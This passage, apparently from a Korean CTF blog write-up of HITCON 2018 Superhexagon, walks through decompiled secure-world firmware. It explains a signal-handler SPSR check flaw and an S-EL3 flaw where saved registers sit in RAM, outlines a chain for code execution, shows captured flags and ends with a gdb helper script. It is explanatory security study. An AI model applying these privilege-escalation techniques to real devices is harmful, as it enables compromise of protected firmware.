</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_080005ac</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>    iVar1 <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    iVar1 <span style="color:#f92672">=</span> iVar1 <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x1000</span> <span style="color:#f92672">+</span> secure_phys_max;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> iVar1;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Secure physical memory에 더해가면서 할당한다.<br>
S-EL1과 S-EL0는 Abort가 발생하면 똑같은 exception handler로 진입한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>        <span style="color:#ae81ff">08001588</span> <span style="color:#ae81ff">3</span>c  e0  <span style="color:#ae81ff">8</span>d  e5    str        lr,[sp,<span style="color:#960050;background-color:#1e0010">#</span>param_11 ]
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0800158</span>c <span style="color:#ae81ff">00</span>  e0  <span style="color:#ae81ff">4f</span>  e1    mrs        lr,spsr
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">08001590</span> <span style="color:#ae81ff">40</span>  e0  <span style="color:#ae81ff">8</span>d  e5    str        lr,[sp,<span style="color:#960050;background-color:#1e0010">#</span>param_12 ]
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">08001594</span> <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">02</span>  f1    cps        <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">19</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">08001598</span> <span style="color:#ae81ff">8</span>a  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  eb    bl         FUN_080017c8                                     undefined <span style="color:#a6e22e">FUN_080017c8</span>(undefined
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0800159</span>c <span style="color:#ae81ff">44</span>  <span style="color:#ae81ff">80</span>  <span style="color:#ae81ff">9</span>d  e5    ldr        r8,[sp,<span style="color:#960050;background-color:#1e0010">#</span>param_13 ]
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">080015</span>a0 <span style="color:#ae81ff">1f</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">02</span>  f1    cps        <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">31</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">080015</span>a4 <span style="color:#ae81ff">08</span>  d0  a0  e1    cpy        sp,r8
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">080015</span>a8 <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">00</span>  a0  e3    mov        param_1 ,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x17</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">080015</span>ac <span style="color:#ae81ff">6</span>b  fd  ff  fb    blx        FUN_08000b62                                     undefined <span style="color:#a6e22e">FUN_08000b62</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">080015</span>b0 b1  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  ea    b          FUN_0800187c                                     undefined <span style="color:#a6e22e">FUN_0800187c</span>(undefined
</span></span><span style="display:flex;"><span>                             <span style="color:#f92672">--</span> Flow Override: <span style="color:#a6e22e">CALL_RETURN</span> (CALL_TERMINATOR)
</span></span></code></pre></div><p>spsr은 exception 발생시에 mode를 가리킨다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">FUN_08000ae0</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((_signal_handler <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    ctx.cpsr <span style="color:#f92672">=</span> ctx.cpsr <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0</span>b11111111111111111111111111011111;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    ctx.cpsr <span style="color:#f92672">=</span> ctx.cpsr <span style="color:#f92672">|</span> <span style="color:#ae81ff">0</span>b00100000;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  ctx.pc <span style="color:#f92672">=</span> _signal_handler;
</span></span><span style="display:flex;"><span>  ctx.r0._0_1_ <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xb</span>;
</span></span><span style="display:flex;"><span>  ctx.r0._1_1_ <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  ctx.r0._2_1_ <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  ctx.r0._3_1_ <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>구조체를 복원했다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>                             LAB_08001870                                    XREF[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">:</span>     FUN_0800187c:<span style="color:#ae81ff">08001888</span> (j)   
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">08001870</span> e8  ff  ff  eb    bl         FUN_08001818                                     undefined <span style="color:#a6e22e">FUN_08001818</span>(undefined
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">08001874</span> <span style="color:#ae81ff">3</span>c  e0  <span style="color:#ae81ff">9</span>d  e5    ldr        lr,[sp,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x3c</span> ]
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">08001878</span> <span style="color:#ae81ff">0</span>e  f0  b0  e1    movs       pc,lr
</span></span></code></pre></div><p>movs pc, lr로 핸들러로 돌아간다.<br>
이때 spsr에 대한 mode 체크가 없다는 취약점이 있다.<br>
이 취약점을 악용하기 위해선 S-EL1에서 Access violation 관련 exception을 일으켜야 한다.</p>
<h3 id="gaining-code-execution-1">Gaining code execution<a hidden class="anchor" aria-hidden="true" href="#gaining-code-execution-1">#</a></h3>
<p>총 세 가지 취약점을 체이닝하면 임의 코드 실행을 얻을 수 있다.</p>
<ol>
<li>World shared memory mapping에 이용되는 메모리 권한 취약점.</li>
<li>Signal exception handler 구현 취약점.</li>
<li>Secure world user application upload에서 발생하는 DOS 취약점.</li>
</ol>
<h3 id="enhancing-the-exploitation-stability">Enhancing the exploitation stability<a hidden class="anchor" aria-hidden="true" href="#enhancing-the-exploitation-stability">#</a></h3>
<p>먼저 S-EL3까지 exploit 하기 위해선 shellcode를 넣을 공간이 필요했다.<br>
기존 익스플로잇은 0x300 크기라서 그 이상가면 런타임에 memcpy가 덮히게 되고, qemu 3.0.0의 버그로 인해 디버깅이 아예 불가능하게 된다.<br>
그래서 디버깅시엔 코드가 실행이 안되고, bp를 설정하지 않으면 코드가 실행이 된다.<br>
결론적으로 불안정한 코드로 인해 발생한 버그라서 memcpy 보다 상위에 있는 코드 스니펫을 덮으려 시도했고, 성공적으로 덮었다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] Switching to interactive mode
</span></span><span style="display:flex;"><span>hitcon{this is flag <span style="color:#ae81ff">3</span> <span style="color:#66d9ef">for</span> EL2}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">\</span>x00hitcon{this is flag <span style="color:#ae81ff">5</span> <span style="color:#66d9ef">for</span> S<span style="color:#f92672">-</span>EL1}[<span style="color:#f92672">*</span>] Got EOF <span style="color:#66d9ef">while</span> reading in interactive
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> 
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] Interrupted
</span></span></code></pre></div><p>Exploit 시나리오 자체는 전과 비슷하다.<br>
똑같이 secure에서 flag를 가져오고, 다시 Normal world로 복귀해서 flag를 출력한다.</p>
<h2 id="s-el3-secure-monitor">S-EL3, Secure monitor<a hidden class="anchor" aria-hidden="true" href="#s-el3-secure-monitor">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>        <span style="color:#ae81ff">00000</span>fa8 f1  <span style="color:#ae81ff">03</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">91</span>    mov        x17 ,sp
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000</span>fac bf  <span style="color:#ae81ff">41</span>  <span style="color:#ae81ff">00</span>  d5    msr        PState<span style="color:#f92672">.</span>SP,<span style="color:#75715e">#0x1</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000</span>fb0 f1  <span style="color:#ae81ff">8</span>b  <span style="color:#ae81ff">00</span>  f9    str        x17 ,[sp, <span style="color:#75715e">#param_11 ]</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000</span>fb4 f2  <span style="color:#ae81ff">83</span>  <span style="color:#ae81ff">40</span>  f9    ldr        x18 ,[sp, <span style="color:#75715e">#SCR_EL3 ]</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000</span>fb8 f0  c7  <span style="color:#ae81ff">51</span>  a9    ldp        x16 ,x17 ,[sp, <span style="color:#75715e">#SPSR_EL3 ]</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000</span>fbc <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">1</span>e  d5    msr        scr_el3 ,x18
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000</span>fc0 <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">40</span>  <span style="color:#ae81ff">1</span>e  d5    msr        spsr_el3 ,x16
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000</span>fc4 <span style="color:#ae81ff">31</span>  <span style="color:#ae81ff">40</span>  <span style="color:#ae81ff">1</span>e  d5    msr        elr_el3 ,x17
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000</span>fc8 f5  ff  ff  <span style="color:#ae81ff">17</span>    b          FUN_00000f9c                                     undefined FUN_00000f9c(undefined
</span></span><span style="display:flex;"><span>                             <span style="color:#f92672">--</span> Flow Override: CALL_RETURN (CALL_TERMINATOR)
</span></span></code></pre></div><p>전에 분석했을 때는 전혀 취약점이 보이지 않았었다.<br>
나중에 다시 보니 쉽게 구조적인 취약점을 발견할 수 있었다.<br>
취약점 상세 내용은 다음과 같다.</p>
<h3 id="vulnerability-4">Vulnerability<a hidden class="anchor" aria-hidden="true" href="#vulnerability-4">#</a></h3>
<p>S-EL3의 일부 rw가 필요한 영역은 RAM에 적재된다.<br>
그런데 context switching 시에 보호해야 할 시스템 레지스터들이 RAM에 올라와있다.<br>
이런 구조는 절대 격리가 유지될 수 있는 구조가 아니다.<br>
이미 ram에 대한 모든 제어권을 가지고 있기에 그냥 바꾸기만 하면 된다.</p>
<p>생각해낸 익스플로잇 시나리오는 다음과 같다.</p>
<ol>
<li>S-EL1 PTE 조작 → 쉘 코드 작성.</li>
<li>S-EL1 PTE 조작 → S-EL3 PTE 조작 → 쉘 코드 페이지 매핑.</li>
<li>S-EL1 PTE 조작 &amp; tlb flush → ctx.pc, ctx.cpsr 변조.</li>
<li>Secure monitor call → ACE.<br>
여기서 세 번째 스텝이 tlb flush 인데 이건 같은 VA를 다른 PA에 매핑하기 위해 연속적으로 같은 VA에 접근해서 tlb가 캐싱되므로 이를 flush 하기 위해서 이용했다.<br>
qemu는 mmu를 프로세서와 완전 동일하게는 아니여도 범용적인 mmu를 softmmu라는 feature로 mmu 에뮬레이션을 지원하기에 꼭 필요한 스텝이다.</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">bool</span> <span style="color:#a6e22e">mmu_lookup1</span>(CPUState <span style="color:#f92672">*</span>cpu, MMULookupPageData <span style="color:#f92672">*</span>data,
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">int</span> mmu_idx, MMUAccessType access_type, <span style="color:#66d9ef">uintptr_t</span> ra)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    vaddr addr <span style="color:#f92672">=</span> data<span style="color:#f92672">-&gt;</span>addr;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uintptr_t</span> index <span style="color:#f92672">=</span> <span style="color:#a6e22e">tlb_index</span>(cpu, mmu_idx, addr);
</span></span><span style="display:flex;"><span>    CPUTLBEntry <span style="color:#f92672">*</span>entry <span style="color:#f92672">=</span> <span style="color:#a6e22e">tlb_entry</span>(cpu, mmu_idx, addr);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> tlb_addr <span style="color:#f92672">=</span> <span style="color:#a6e22e">tlb_read_idx</span>(entry, access_type);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">bool</span> maybe_resized <span style="color:#f92672">=</span> false;
</span></span><span style="display:flex;"><span>    CPUTLBEntryFull <span style="color:#f92672">*</span>full;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> flags;
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* If the TLB entry is for a different page, reload and try again.  */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">tlb_hit</span>(tlb_addr, addr)) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">victim_tlb_hit</span>(cpu, mmu_idx, index, access_type,
</span></span><span style="display:flex;"><span>                            addr <span style="color:#f92672">&amp;</span> TARGET_PAGE_MASK)) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">tlb_fill</span>(cpu, addr, data<span style="color:#f92672">-&gt;</span>size, access_type, mmu_idx, ra);
</span></span><span style="display:flex;"><span>            maybe_resized <span style="color:#f92672">=</span> true;
</span></span><span style="display:flex;"><span>            index <span style="color:#f92672">=</span> <span style="color:#a6e22e">tlb_index</span>(cpu, mmu_idx, addr);
</span></span><span style="display:flex;"><span>            entry <span style="color:#f92672">=</span> <span style="color:#a6e22e">tlb_entry</span>(cpu, mmu_idx, addr);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        tlb_addr <span style="color:#f92672">=</span> <span style="color:#a6e22e">tlb_read_idx</span>(entry, access_type) <span style="color:#f92672">&amp;</span> <span style="color:#f92672">~</span>TLB_INVALID_MASK;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    full <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>cpu<span style="color:#f92672">-&gt;</span>neg.tlb.d[mmu_idx].fulltlb[index];
</span></span><span style="display:flex;"><span>    flags <span style="color:#f92672">=</span> tlb_addr <span style="color:#f92672">&amp;</span> (TLB_FLAGS_MASK <span style="color:#f92672">&amp;</span> <span style="color:#f92672">~</span>TLB_FORCE_SLOW);
</span></span><span style="display:flex;"><span>    flags <span style="color:#f92672">|=</span> full<span style="color:#f92672">-&gt;</span>slow_flags[access_type];
</span></span><span style="display:flex;"><span>    data<span style="color:#f92672">-&gt;</span>full <span style="color:#f92672">=</span> full;
</span></span><span style="display:flex;"><span>    data<span style="color:#f92672">-&gt;</span>flags <span style="color:#f92672">=</span> flags;
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Compute haddr speculatively; depending on flags it might be invalid. */</span>
</span></span><span style="display:flex;"><span>    data<span style="color:#f92672">-&gt;</span>haddr <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">uintptr_t</span>)addr <span style="color:#f92672">+</span> entry<span style="color:#f92672">-&gt;</span>addend);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> maybe_resized;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>mmu_lookup1 함수에서 hit이면 그냥 저장된 인덱스에 맞춰서 바로 리턴하는 것을 확인할 수 있다.<br>
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/230f82e498d4aa43cc1ed80c24ffd70d.png" alt=""  />
<br>
쉘 코드 길이를 늘리기 위해선 그냥 여기서 fault 내고 더 낮은 exception vector offset으로 뛰면 0xd00 주변으로 뛸 수 있다.<br>
그걸 이용해서 0xd00 주변에 쉘 코드를 배치한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">\</span>x00hitcon{this is flag <span style="color:#ae81ff">6</span> <span style="color:#66d9ef">for</span> EL3}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">\</span>x00hitcon{this is flag <span style="color:#ae81ff">6</span> <span style="color:#66d9ef">for</span> EL3}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">\</span>x00hitcon{this is flag <span style="color:#ae81ff">6</span> <span style="color:#66d9ef">for</span> EL3}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">\</span>x00<span style="color:#960050;background-color:#1e0010">$</span> 
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] Interrupted
</span></span><span style="display:flex;"><span>hitcon{this is flag <span style="color:#ae81ff">6</span> <span style="color:#66d9ef">for</span> EL3}
</span></span></code></pre></div><h1 id="appendix">Appendix<a hidden class="anchor" aria-hidden="true" href="#appendix">#</a></h1>
<h2 id="gdbscript">Gdbscript<a hidden class="anchor" aria-hidden="true" href="#gdbscript">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> gdb
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> psutil
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CPSR</span>(gdb<span style="color:#f92672">.</span>Command):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self):
</span></span><span style="display:flex;"><span>        super(CPSR, self)<span style="color:#f92672">.</span>__init__(<span style="color:#e6db74">&#34;cpsr&#34;</span>, gdb<span style="color:#f92672">.</span>COMMAND_USER)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">invoke</span>(self, arg, from_tty):
</span></span><span style="display:flex;"><span>        cpsr <span style="color:#f92672">=</span> (int(gdb<span style="color:#f92672">.</span>parse_and_eval(<span style="color:#e6db74">&#34;$cpsr&#34;</span>)))
</span></span><span style="display:flex;"><span>        mode <span style="color:#f92672">=</span> cpsr <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0b1111</span>
</span></span><span style="display:flex;"><span>        is_thumb <span style="color:#f92672">=</span> (cpsr <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">4</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        state <span style="color:#f92672">=</span> (cpsr <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">4</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        IRQ <span style="color:#f92672">=</span> (cpsr <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">5</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        FIQ <span style="color:#f92672">=</span> (cpsr <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">6</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        cond <span style="color:#f92672">=</span> (cpsr <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">27</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0b1111</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        re <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> state:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#ae81ff">0b0000</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;EL0t&#39;</span> <span style="color:#75715e"># SP_EL0</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b0100</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;EL1t&#39;</span> <span style="color:#75715e"># SP_EL0</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b0101</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;EL1h&#39;</span> <span style="color:#75715e"># SP_EL1</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b1000</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;EL2t&#39;</span> <span style="color:#75715e"># SP_EL0</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b1001</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;EL2h&#39;</span> <span style="color:#75715e"># SP_EL2</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b1100</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;EL3t&#39;</span> <span style="color:#75715e"># SP_EL0</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b1101</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;EL3h&#39;</span> <span style="color:#75715e"># SP_EL3</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;UNK&#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#ae81ff">0b0000</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;User&#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b0001</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;FIQ&#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b0010</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;IRQ&#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b0011</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;Supervisor&#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b0110</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;Monitor&#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b0111</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;Abort&#39;</span> 
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b1010</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;Hyp&#39;</span> 
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b1011</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;Undefined&#39;</span> 
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b1111</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;System&#39;</span> 
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;UNK&#39;</span>
</span></span><span style="display:flex;"><span>        re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; | &#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> IRQ:
</span></span><span style="display:flex;"><span>            re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;IRQ_MASKED | &#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> FIQ:
</span></span><span style="display:flex;"><span>            re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;FIQ_MASKED | &#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> is_thumb:
</span></span><span style="display:flex;"><span>            re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;THUMB_MODE | &#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> state:
</span></span><span style="display:flex;"><span>            re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;32-BIT | &#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;64-BIT | &#39;</span>
</span></span><span style="display:flex;"><span>        re <span style="color:#f92672">+=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;COND_</span><span style="color:#e6db74">{</span>hex(cond)[<span style="color:#ae81ff">2</span>:]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>        print(re)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">SPSR_EL3</span>(gdb<span style="color:#f92672">.</span>Command):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self):
</span></span><span style="display:flex;"><span>        super(SPSR_EL3, self)<span style="color:#f92672">.</span>__init__(<span style="color:#e6db74">&#34;spsr_el3&#34;</span>, gdb<span style="color:#f92672">.</span>COMMAND_USER)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">invoke</span>(self, arg, from_tty):
</span></span><span style="display:flex;"><span>        spsr <span style="color:#f92672">=</span> (int(gdb<span style="color:#f92672">.</span>parse_and_eval(<span style="color:#e6db74">&#34;$SPSR_EL3&#34;</span>)))
